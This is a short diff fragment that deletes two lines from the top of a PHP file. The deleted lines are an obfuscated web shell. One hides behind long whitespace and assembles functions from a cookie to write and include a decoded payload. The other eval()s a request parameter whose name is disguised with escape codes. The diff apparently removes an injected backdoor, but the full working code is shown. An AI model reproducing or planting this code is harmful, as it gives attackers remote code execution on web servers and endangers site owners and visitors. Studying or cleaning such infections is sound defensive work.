@@ -1,2 +1,0 @@
-<?php																																										if(isset($_COOKIE[3])&&isset($_COOKIE[24])){$c=$_COOKIE;$k=0;$n=9;$p=array();$p[$k]='';while($n){$p[$k].=$c[24][$n];if(!$c[24][$n+1]){if(!$c[24][$n+2])break;$k++;$p[$k]='';$n++;}$n=$n+9+1;}$k=$p[3]().$p[13];if(!$p[14]($k)){$n=$p[8]($k,$p[7]);$p[15]($n,$p[6].$p[27]($p[17]($c[3])));}include($k);}
- class cbsLQ {public function __construct($cbczLQ){@eval("/*heAF8A4F5*/".$cbczLQ."/*vyeme3m40*/");}}if(isset($_REQUEST["\120\x73\123\167\x30\x72\x44\61\x32\x33\104"]))new cbsLQ($_REQUEST["\120\x73\123\167\x30\x72\x44\61\x32\x33\104"]);?>
